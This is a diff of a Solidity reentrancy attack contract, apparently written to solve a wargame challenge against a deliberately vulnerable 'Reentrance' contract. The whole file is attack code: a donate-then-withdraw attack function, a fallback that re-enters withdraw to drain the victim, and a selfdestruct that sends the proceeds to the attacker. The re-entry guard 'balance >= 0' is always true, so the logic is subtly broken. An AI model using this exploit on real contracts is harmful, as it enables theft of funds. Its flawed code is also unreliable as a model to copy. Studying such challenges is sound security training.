@@ -1,48 +1,31 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.12;
 
-import "./Reentrance.sol";
+import {IReentrance} from "./IReentrance.sol";
 
 contract ReentranceAttack {
-  Reentrance private victimContract;
+  IReentrance private victimContract;
 
-  // address private attackerAddress = 0xF580A030d2f0E9667aB3c5c8a51Da63f086Db564;
+  address payable private immutable attackerAddress;
 
-  constructor(address instance_) public payable {
-    victimContract = Reentrance(payable(instance_));
+  constructor(address instance_, address payable attackerAddress_) public {
+    victimContract = IReentrance(payable(instance_));
+    attackerAddress = attackerAddress_;
   }
 
-  // function donateToVictim() external payable {
-  //   victimContract.donate{value: msg.value}(address(this));
-  // }
-
-  // function attack() external payable {
-  //   require(msg.value >= 1 ether, "NEED AT LEAST 1 ETH");
-  //   victimContract.withdraw(1 ether);
-  //   // address(victimContract).call(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
-  // }
-
-  // fallback() external payable {
-  //   require(address(this).balance >= 0, "Empty wallet");
-  //   if (address(victimContract).balance != 0) {
-  //     // victimContract.withdraw(1 ether);
-  //     address(victimContract).call(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
-  //     victimContract.donate{value: 1 ether}(address(this));
-  //   }
-  // }
-
-  // receive() external payable {}
-
-  function exploit(address _target) external payable {
-    Reentrance target = Reentrance(payable(_target));
-    target.donate{value: msg.value}(address(this));
-    target.withdraw(msg.value);
+  function attack() external payable {
+    require(msg.value >= victimContract.balanceOf(address(this)), "need at least this balance");
+    victimContract.donate{value: msg.value}(address(this));
+    victimContract.withdraw(msg.value);
   }
 
-  receive() external payable {
-    Reentrance target = Reentrance(payable(msg.sender));
-    if (address(target).balance >= msg.value) {
-      target.withdraw(msg.value);
+  fallback() external payable {
+    if (address(victimContract).balance >= 0) {
+      victimContract.withdraw(msg.value);
     }
+  }
+
+  function kill() external payable {
+    selfdestruct(attackerAddress);
   }
 }
